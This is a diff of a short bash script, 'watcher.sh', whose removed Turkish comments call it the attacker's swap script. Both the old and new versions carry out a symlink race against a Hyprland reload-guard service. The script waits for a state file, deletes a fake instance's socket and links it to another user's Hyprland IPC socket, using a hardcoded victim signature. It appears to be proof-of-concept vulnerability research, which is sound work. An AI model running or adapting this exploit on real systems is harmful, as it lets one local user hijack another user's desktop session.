@@ -1,17 +1,13 @@
 #!/bin/bash
-# watcher.sh - attacker'ın swap scripti
-FAKE_DIR="/run/user/1002/hypr/fakeinst"
-VICTIM_SIG="$1"   # komut satırından B'nin signature'ını alacağız
-VICTIM_DIR="/run/user/1000/hypr/${VICTIM_SIG}"
+set -e
+B_UID=1000
+B_SIG="efb50993780079460b0cbed1363e2166a2de1d9f_1791076247_1592613498"
+FAKE=/run/user/1002/hypr/fake_0
+STATE=/run/omarchy/hyprland-reload-guard/fake_0
 
-echo "Watching for pause request..."
-echo "Will swap to: $VICTIM_DIR"
+echo "waiting for $STATE ..."
+while [ ! -e "$STATE" ]; do sleep 0.02; done
 
-# Basit versiyon: sürekli kontrol et, server bir istek aldığında hemen swap yap
-# (gerçek watcher burada log dosyasını izleyebilir, ama basit tutalım: sabit bekleme + swap)
-
-sleep 1
-rm -rf "$FAKE_DIR"
-ln -s "$VICTIM_DIR" "$FAKE_DIR"
-echo "Swapped $FAKE_DIR -> $VICTIM_DIR"
-ls -la "$FAKE_DIR"
+rm -f "$FAKE/.socket.sock"
+ln -s "/run/user/$B_UID/hypr/$B_SIG/.socket.sock" "$FAKE/.socket.sock"
+echo "swapped $FAKE/.socket.sock -> /run/user/$B_UID/hypr/$B_SIG/.socket.sock"
